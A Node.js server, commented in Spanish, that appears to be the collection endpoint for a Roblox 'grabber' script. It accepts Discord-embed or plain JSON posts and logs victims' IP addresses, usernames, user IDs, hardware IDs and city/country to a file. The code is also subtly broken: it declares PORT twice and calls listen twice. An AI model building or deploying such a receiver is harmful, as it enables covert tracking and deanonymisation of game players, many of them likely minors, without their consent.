const http = require('http');
const fs = require('fs');

const server = http.createServer((req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        res.writeHead(204);
        res.end();
        return;
    }

    if (req.method === 'POST') {
        let body = '';
        
        req.on('data', chunk => {
            body += chunk.toString();
        });

        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                const timestamp = new Date().toISOString();
                
                let ip = "N/A";
                let username = "N/A";
                let userid = "N/A";
                let hwid = "N/A";
                let city = "N/A";
                let country = "N/A";

                // Si viene en el formato de embeds de Discord del script de Roblox
                if (data.embeds && data.embeds[0] && data.embeds[0].fields) {
                    data.embeds[0].fields.forEach(field => {
                        if (field.name === "IP Address") ip = field.value;
                        if (field.name === "Username") username = field.value;
                        if (field.name === "User ID") userid = field.value;
                        if (field.name === "HWID") hwid = field.value;
                        if (field.name === "City") city = field.value;
                        if (field.name === "Country") country = field.value;
                    });
                } else {
                    // Si viene en formato plano tradicional
                    ip = data.ip || "N/A";
                    username = data.username || "N/A";
                    userid = data.userid || "N/A";
                    hwid = data.hwid || "N/A";
                    city = data.city || "N/A";
                    country = data.country || "N/A";
                }

                const logEntry = `[${timestamp}] IP: ${ip} | User: ${username} (ID: ${userid}) | HWID: ${hwid} | Ubicación: ${city}, ${country}\n`;
                
                console.log("Registro capturado correctamente:", logEntry);

                fs.appendFile('logs.txt', logEntry, err => {
                    if (err) console.error("Error al guardar en el archivo:", err);
                });

                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ status: "success", message: "Guardado" }));
            } catch (e) {
                console.error("Error al procesar JSON:", e);
                res.writeHead(400, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ status: "error", message: "JSON inválido" }));
            }
        });
    } else {
        res.writeHead(404, { 'Content-Type': 'text/plain' });
        res.end("Ruta no encontrada");
    }
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Servidor activo en el puerto ${PORT}`);
});
// Forzar el puerto exacto que te asignó Bot-Hosting
const PORT = process.env.PORT || 26237;

server.listen(PORT, () => {
    console.log(`Servidor activo en el puerto ${PORT}`);
});
